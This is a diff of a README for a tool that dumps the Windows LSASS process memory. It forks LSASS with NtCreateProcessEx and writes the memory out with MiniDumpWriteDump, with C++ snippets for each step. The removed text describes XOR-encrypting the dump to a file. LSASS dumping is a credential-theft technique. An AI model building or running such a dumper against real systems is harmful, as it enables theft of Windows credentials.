@@ -1,84 +1,81 @@
 
-# LSASS Process Dumper and Encrypter
+# LSASS Process Dumper
 
-This repository contains two programs: one for dumping the `lsass.exe` process memory to a file and encrypting it using XOR encryption, and another for decrypting the encrypted dump file.
+This project demonstrates how to create a fork of the LSASS process and dump its memory using the Windows API. This can be useful for forensic analysis and security research.
 
-## Overview
+## Features
 
-### Programs
+- Locates the LSASS process by name.
+- Uses `NtCreateProcessEx` to create a fork of the LSASS process.
+- Dumps the memory of the forked process to a file using `MiniDumpWriteDump`.
 
-1. **sasDump**: Dumps the memory of the `lsass.exe` process and XOR encrypts the dump file with a key of `5` before saving it to disk.
-2. **Decrypt**: Reads the encrypted dump file, decrypts it, and saves the decrypted content to a new file.
+## Prerequisites
 
-## Files
+- Windows operating system
+- Visual Studio or any other C++ compiler
+- Administrator privileges
 
-- `sasDum.cpp`: The program that dumps the `lsass.exe` process and encrypts the dump file.
-- `decrypt.cpp`: The program that decrypts the encrypted dump file.
+## Libraries and Dependencies
 
-## Requirements
+- `windows.h`
+- `DbgHelp.h`
+- `TlHelp32.h`
+- `winternl.h`
+- `tchar.h`
+- Link with `Dbghelp.lib` and `ntdll.lib`
 
-- Windows OS
-- Visual Studio or any C++ compiler supporting Windows API and DbgHelp library
+## How to Build
 
-## Usage
+1. Clone the repository.
+2. Open the project in Visual Studio or your preferred C++ development environment.
+3. Ensure that you have linked `Dbghelp.lib` and `ntdll.lib` in your project settings.
+4. Build the project.
 
-### sasDump
+## How to Run
 
-1. **Compile `sasDum.cpp`**:
-    ```sh
-    cl /EHsc sasDum.cpp /link dbghelp.lib
-    ```
-
-2. **Run the executable**:
-    ```sh
-    sasDum.exe
-    ```
-
-3. **Output**: The encrypted dump file `encDump.txt` will be created in the same directory.
-
-### Decrypt
-
-1. **Compile `decrypt.cpp`**:
-    ```sh
-    cl /EHsc decrypt.cpp
-    ```
-
-2. **Run the executable**:
-    ```sh
-    decrypt.exe
-    ```
-
-3. **Output**: The decrypted dump file `encDump.txt` will be created in the same directory.
+1. Ensure you are running with administrator privileges.
+2. Execute the compiled binary.
+3. The program will create a memory dump of the forked LSASS process and save it as `lsass_forked.dmp`.
 
 ## Code Explanation
 
-### sasDum.cpp
+### Finding LSASS PID
 
-This program:
-1. Finds the PID of the `lsass.exe` process.
-2. Opens a handle to the `lsass.exe` process.
-3. Uses `NtCreateProcessEx` to create a forked process of `lsass`.
-4. Uses `MiniDumpWriteDump` to dump the memory of the forked process to a temporary file.
-5. Reads the temporary dump file into memory.
-6. XOR encrypts the dump file content with the key `5`.
-7. Writes the encrypted content to `encDump.txt`.
+The program takes a snapshot of all running processes and iterates through them to find the process with the name `lsass.exe`.
 
-### decrypt.cpp
+```cpp
+HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+PROCESSENTRY32 processEntry = {};
+processEntry.dwSize = sizeof(PROCESSENTRY32);
 
-This program:
-1. Opens the encrypted dump file `encDump.txt`.
-2. Reads the encrypted content into memory.
-3. XOR decrypts the content with the key `5`.
-4. Writes the decrypted content to `encDump.txt`.
+if (Process32First(snapshot, &processEntry)) {
+    do {
+        if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
+            lsassPID = processEntry.th32ProcessID;
+            break;
+        }
+    } while (Process32Next(snapshot, &processEntry));
+}
+```
+
+### Creating Forked Process
+
+The program uses `NtCreateProcessEx` to create a new process that is a fork of the LSASS process.
+
+```cpp
+pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
+NTSTATUS status = NtCreateProcessEx(&forkedProcess, PROCESS_ALL_ACCESS, NULL, lsassHandle, 0, NULL, NULL, NULL);
+```
+
+### Dumping the Forked Process
+
+The program uses `MiniDumpWriteDump` to create a dump of the forked process.
+
+```cpp
+DWORD forkedProcessPID = GetProcessId(forkedProcess);
+BOOL isDumped = MiniDumpWriteDump(forkedProcess, forkedProcessPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+```
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
-
-## Contact
-
-For any questions, please open an issue or contact the repository owner.
+This project is licensed under the MIT License.
